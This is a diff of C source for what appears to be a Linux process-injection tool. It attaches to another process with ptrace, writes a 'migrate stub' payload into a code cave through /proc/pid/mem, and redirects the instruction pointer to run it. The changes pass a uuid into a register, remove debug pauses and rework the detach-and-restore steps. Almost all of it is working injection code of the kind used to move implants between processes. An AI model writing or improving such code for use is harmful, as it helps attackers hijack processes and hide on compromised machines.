@@ -110,7 +110,7 @@ unsigned long find_codecave(int pid, long start, long end, int cave_size)
 
 };
 
-int copy_payload(int pid, unsigned long target_addr, char * payload, int payload_length, long * restore_addr)
+int copy_payload(int pid, unsigned long target_addr, char * payload, int payload_length, long * restore_addr, const char * uuid)
 {
   
   //write payload to target file
@@ -131,13 +131,11 @@ int copy_payload(int pid, unsigned long target_addr, char * payload, int payload
   
   fclose(mem_handler);
   
-  getchar();
-  
   //overwrite RIP using ptrace
   ptrace(PTRACE_ATTACH, pid, NULL, NULL);
   waitpid(pid, NULL, 0);
 
-  ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACECLONE);
+  //ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACECLONE);
   
   ptrace(PTRACE_GETREGS, pid, NULL, &regs);
 
@@ -147,6 +145,7 @@ int copy_payload(int pid, unsigned long target_addr, char * payload, int payload
   printf("Original RIP: %lx\n", original_rip);
   
   regs.rip = target_addr+2;
+  regs.r15 = *uuid;
   
   ptrace(PTRACE_SETREGS, pid, NULL, &regs);
 
@@ -175,7 +174,7 @@ int inject_payload(int pid, long target_addr, char * payload, size_t payload_len
   return 1;
 }
 
-int inject_migrate_stub(int pid, char * migrate_stub, size_t migrate_stub_length, long * restore_addr){
+int inject_migrate_stub(int pid, char * migrate_stub, size_t migrate_stub_length, long * restore_addr, const char * uuid){
   
   FILE * maps_handler;
   char maps_file_path[80];
@@ -216,9 +215,8 @@ int inject_migrate_stub(int pid, char * migrate_stub, size_t migrate_stub_length
     long code_cave_address = find_codecave(pid,start_address, end_address, migrate_stub_length);
     if(code_cave_address){
       printf("Found code cave at: %lx\n", code_cave_address);
-      getchar();
 
-      if(copy_payload(pid, code_cave_address, migrate_stub, migrate_stub_length, restore_addr))
+      if(copy_payload(pid, code_cave_address, migrate_stub, migrate_stub_length, restore_addr, uuid))
       {
         return 1;
       }
@@ -243,21 +241,20 @@ void restore_parent(int pid,long original_rip)
   ptrace(PTRACE_SETREGS, pid, NULL, &regs);
 }
 
-int migrate(int pid, char * migrate_stub, size_t migrate_stub_length, char * payload, size_t payload_length)
+int migrate(int pid, char * migrate_stub, size_t migrate_stub_length, char * payload, size_t payload_length, const char * uuid)
 {
   int status;
   struct user_regs_struct regs;
   long restore_addr;
   
   //if injection fails, send detach and continue signals just in case 
-  if(!inject_migrate_stub(pid,migrate_stub, migrate_stub_length, &restore_addr)){
+  if(!inject_migrate_stub(pid,migrate_stub, migrate_stub_length, &restore_addr, uuid)){
     ptrace(PTRACE_CONT, pid, NULL, NULL);
     ptrace(PTRACE_DETACH, pid, NULL, NULL);
     return 0;
   }
-  
+
   ptrace(PTRACE_CONT, pid, NULL, NULL);
-  //ptrace(PTRACE_DETACH, pid, NULL, NULL);
   
   //waits for first interrupt
   wait(&status);
@@ -279,17 +276,21 @@ int migrate(int pid, char * migrate_stub, size_t migrate_stub_length, char * pay
       ptrace(PTRACE_DETACH, pid, NULL, NULL);
       return 0;
     }
-   
-    ptrace(PTRACE_CONT, pid, NULL, NULL);
-    wait(&status);
 
+    ptrace(PTRACE_CONT, pid, NULL, NULL);
+    printf("[+] Waiting for stuff...\n");
+    wait(&status);
+    printf("[+] Done waiting...\n");
     if(WIFSTOPPED(status) && WSTOPSIG(status) == 5){
+      printf("[+] Restoring stuff...\n");
       restore_parent(pid, restore_addr);
       
-      //kill(pid, SIGSTOP);
-      ptrace(PTRACE_CONT, pid, NULL, NULL);
-      ptrace(PTRACE_DETACH, pid, NULL, NULL);
+      if(ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1){
+        printf("[-] Failed to detach..\n");
+        return 0;
+      }
 
+      printf("[+] Detached, done...\n");
       return 1;
     }
 
